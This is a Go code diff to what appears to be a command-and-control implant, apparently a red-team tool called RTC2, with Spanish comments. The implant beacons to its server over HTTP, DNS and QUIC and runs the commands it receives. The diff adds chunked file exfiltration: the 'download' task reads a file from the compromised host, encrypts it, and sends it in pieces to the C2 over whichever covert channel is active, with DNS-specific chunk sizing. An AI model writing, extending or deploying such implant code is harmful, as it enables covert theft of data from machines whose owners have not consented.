@@ -37,9 +37,11 @@ import (
 	"context" 
 	"crypto/ecdh"
 	"crypto/rand"
+	"crypto/sha256" 
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/hex" 
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -80,6 +82,14 @@ const (
 var (
 	sleepSecs  = SleepSecs
 	jitterPerc = JitterPerc
+
+	senderSc          *crypto.SessionCrypto
+	senderImplantID   string
+	senderTransport   string // "http" | "dns" | "quic"
+	senderProfileHTTP *profiles.Profile
+	senderProfileDNS  *profiles.DNSProfile
+	senderProfileQUIC *profiles.QUICProfile
+	currentTaskID     string
 
 	// debugEnabled controla si se emiten logs de diagnóstico a stderr.
 	// Se activa con la variable de entorno RTC2_DEBUG=1 (o cualquier
@@ -203,6 +213,13 @@ func runHTTP() {
 			sc = s
 			implantID = id
 			implantIDGlobal = id
+
+			// Estado del emisor chunked.
+			senderTransport = "http"
+			senderSc = sc
+			senderImplantID = implantID
+			senderProfileHTTP = profile
+
 			debugLog("handshake OK implant_id=%s", implantID)
 		}
 
@@ -210,6 +227,8 @@ func runHTTP() {
 			debugLog("beacon falló: %v — reseteando sesión", err)
 			sc = nil
 			implantID = ""
+			senderSc = nil
+			senderImplantID = ""
 		}
 
 		sleepWithJitter()
@@ -370,6 +389,7 @@ func beaconHTTP(profile *profiles.Profile, implantID string, sc *crypto.SessionC
 
 	for i, t := range tasks {
 		debugLog("beacon: tarea %d/%d id=%s cmd=%s args=%v", i+1, len(tasks), t.ID, t.Command, t.Args)
+		currentTaskID = t.ID 
 		output, errMsg := executeTask(t.Command, t.Args, t.Payload)
 		debugLog("beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
 
@@ -464,6 +484,13 @@ func runQUIC() {
 			}
 			sc = s
 			implantID = id
+
+			// Estado del emisor chunked.
+			senderTransport = "quic"
+			senderSc = sc
+			senderImplantID = implantID
+			senderProfileQUIC = profile
+
 			debugLog("handshake QUIC OK implant_id=%s", implantID)
 		}
 
@@ -471,6 +498,8 @@ func runQUIC() {
 			debugLog("beacon QUIC falló: %v — reseteando sesión", err)
 			sc = nil
 			implantID = ""
+			senderSc = nil
+			senderImplantID = ""
 		}
 
 		sleepWithJitter()
@@ -582,6 +611,7 @@ func beaconQUIC(profile *profiles.QUICProfile, implantID string, sc *crypto.Sess
 
 	for i, t := range tasks {
 		debugLog("quic beacon: tarea %d/%d id=%s cmd=%s", i+1, len(tasks), t.ID, t.Command)
+		currentTaskID = t.ID 
 		output, errMsg := executeTask(t.Command, t.Args, t.Payload)
 		debugLog("quic beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
 
@@ -737,6 +767,13 @@ func runDNS() {
 			}
 			sc = s
 			implantID = id
+
+			// Estado del emisor chunked.
+			senderTransport = "dns"
+			senderSc = sc
+			senderImplantID = implantID
+			senderProfileDNS = profile
+
 			debugLog("handshake DNS OK implant_id=%s", implantID)
 		}
 
@@ -744,6 +781,8 @@ func runDNS() {
 			debugLog("beacon DNS falló: %v — reseteando sesión", err)
 			sc = nil
 			implantID = ""
+			senderSc = nil
+			senderImplantID = ""
 		}
 
 		sleepWithJitter()
@@ -861,6 +900,7 @@ func beaconDNS(profile *profiles.DNSProfile, implantID string, sc *crypto.Sessio
 
 	for i, t := range tasks {
 		debugLog("dns beacon: tarea %d/%d id=%s cmd=%s", i+1, len(tasks), t.ID, t.Command)
+		currentTaskID = t.ID 
 		output, errMsg := executeTask(t.Command, t.Args, t.Payload)
 		debugLog("dns beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
 
@@ -1168,11 +1208,7 @@ func executeTask(command string, args []string, payload []byte) ([]byte, string)
 		if len(args) == 0 {
 			return nil, "uso: download <ruta>"
 		}
-		data, err := os.ReadFile(resolvePath(args[0]))
-		if err != nil {
-			return nil, err.Error()
-		}
-		return data, ""
+		return runDownloadChunked(args[0])
 
 	case "ps":
 		return runPS()
@@ -2385,6 +2421,182 @@ func randomSessionKey() string {
 		out[i] = charset[int(v)%len(charset)]
 	}
 	return string(out)
+}
+
+// ════════════════════════════════════════════════════════════════════
+// Transferencia chunked
+// ════════════════════════════════════════════════════════════════════
+
+// runDownloadChunked lee un archivo y lo envía al C2 en chunks usando el
+// transporte activo. Devuelve un resumen pequeño como resultado de la
+// tarea; el archivo en sí llega al server como mensajes MsgFileChunk
+// independientes que el TransferManager reensambla.
+func runDownloadChunked(path string) ([]byte, string) {
+	data, err := os.ReadFile(resolvePath(path))
+	if err != nil {
+		return nil, err.Error()
+	}
+	if len(data) == 0 {
+		return []byte("archivo vacío, nada que enviar\n"), ""
+	}
+
+	sum := sha256.Sum256(data)
+	transferID := randomTransferID()
+	name := filepath.Base(path)
+	chunkSize := chunkSizeForTransport()
+
+	// Trocear.
+	var chunks [][]byte
+	for i := 0; i < len(data); i += chunkSize {
+		end := i + chunkSize
+		if end > len(data) {
+			end = len(data)
+		}
+		chunks = append(chunks, data[i:end])
+	}
+
+	debugLog("download: %s (%d bytes) → %d chunks de %d bytes",
+		name, len(data), len(chunks), chunkSize)
+
+	// 1. start
+	start := protocol.FileTransferWire{
+		Kind:       "start",
+		TransferID: transferID,
+		TaskID:     currentTaskID,
+		Direction:  "to_c2",
+		Path:       path,
+		Name:       name,
+		TotalSize:  int64(len(data)),
+		SHA256:     hex.EncodeToString(sum[:]),
+		ChunkCount: len(chunks),
+	}
+	if err := sendFileWire(start); err != nil {
+		return nil, fmt.Sprintf("transfer start: %v", err)
+	}
+
+	// 2. chunks
+	for i, chunk := range chunks {
+		wire := protocol.FileTransferWire{
+			Kind:       "chunk",
+			TransferID: transferID,
+			Index:      i,
+			Data:       chunk,
+		}
+		if err := sendFileWire(wire); err != nil {
+			_ = sendFileWire(protocol.FileTransferWire{
+				Kind:       "end",
+				TransferID: transferID,
+				OK:         false,
+				Error:      fmt.Sprintf("chunk %d: %v", i, err),
+			})
+			return nil, fmt.Sprintf("transfer chunk %d: %v", i, err)
+		}
+		debugLog("download: chunk %d/%d enviado (%d bytes)", i+1, len(chunks), len(chunk))
+		// Pequeña pausa en DNS para no saturar.
+		if senderTransport == "dns" {
+			time.Sleep(30 * time.Millisecond)
+		}
+	}
+
+	// 3. end
+	if err := sendFileWire(protocol.FileTransferWire{
+		Kind:       "end",
+		TransferID: transferID,
+		OK:         true,
+	}); err != nil {
+		return nil, fmt.Sprintf("transfer end: %v", err)
+	}
+
+	return []byte(fmt.Sprintf(
+		"transfer completado: %s (%d bytes, %d chunks, sha256=%s)\n",
+		name, len(data), len(chunks), hex.EncodeToString(sum[:]),
+	)), ""
+}
+
+// chunkSizeForTransport devuelve el tamaño de chunk apropiado para el
+// transporte activo. DNS usa chunks pequeños (2 KB) para que cada uno
+// quepa en el envelope con margen; el resto usa 1 MB.
+func chunkSizeForTransport() int {
+	if senderTransport == "dns" {
+		return 2 * 1024
+	}
+	return 1024 * 1024
+}
+
+// randomTransferID genera un UUID v4 formateado, sin usar dependencias
+// externas (el template no importa google/uuid).
+func randomTransferID() string {
+	b := make([]byte, 16)
+	rand.Read(b)
+	b[6] = (b[6] & 0x0f) | 0x40 // versión 4
+	b[8] = (b[8] & 0x3f) | 0x80 // variante
+	return fmt.Sprintf("%x-%x-%x-%x-%x",
+		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
+}
+
+// sendFileWire cifra y envía un FileTransferWire por el transporte activo.
+func sendFileWire(wire protocol.FileTransferWire) error {
+	if senderSc == nil || senderImplantID == "" {
+		return fmt.Errorf("transfer: sin sesión activa")
+	}
+
+	plaintext, err := json.Marshal(wire)
+	if err != nil {
+		return fmt.Errorf("marshal: %w", err)
+	}
+	encrypted, err := senderSc.EncryptForC2(plaintext, nil)
+	if err != nil {
+		return fmt.Errorf("cifrar: %w", err)
+	}
+	wrapper := protocol.EncryptedWrapper{
+		ImplantID: senderImplantID,
+		Data:      encrypted,
+	}
+	wrapJSON, _ := json.Marshal(wrapper)
+	env := protocol.NewEnvelope(protocol.MsgFileChunk, wrapJSON)
+
+	switch senderTransport {
+	case "http":
+		return sendHTTPEnvelope(env)
+	case "dns":
+		_, err := exchangeDNS(senderProfileDNS, env, senderImplantID)
+		return err
+	case "quic":
+		_, err := exchangeQUIC(senderProfileQUIC, env)
+		return err
+	default:
+		return fmt.Errorf("transporte desconocido: %q", senderTransport)
+	}
+}
+
+// sendHTTPEnvelope envía un envelope ya construido por HTTPS.
+func sendHTTPEnvelope(env *protocol.Envelope) error {
+	envBytes, err := env.Marshal()
+	if err != nil {
+		return err
+	}
+	httpReq, err := http.NewRequest("POST", ListenerURL, bytes.NewReader(envBytes))
+	if err != nil {
+		return err
+	}
+	if senderProfileHTTP != nil {
+		senderProfileHTTP.ApplyHeaders(httpReq)
+	}
+	httpReq.Header.Set("Content-Type", "application/octet-stream")
+
+	client, err := newHTTPClient()
+	if err != nil {
+		return err
+	}
+	resp, err := client.Do(httpReq)
+	if err != nil {
+		return err
+	}
+	resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("HTTP %d", resp.StatusCode)
+	}
+	return nil
 }
 
 // silenciarWarnings evita que el compilador se queje si en alguna
